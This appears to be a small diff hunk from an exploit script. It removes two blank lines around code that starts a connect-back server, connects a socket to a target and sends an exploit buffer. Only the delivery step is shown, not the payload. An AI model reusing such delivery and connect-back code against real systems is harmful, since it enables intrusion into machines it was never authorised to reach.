@@ -107,9 +107,7 @@ pid=connectback_server.serve()
 time.sleep(1)
 if pid:
     try:
-
         sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
         sock.connect((addr,port))
         logger.LOG_INFO("sending exploit.")
         sock.send(str(buf))
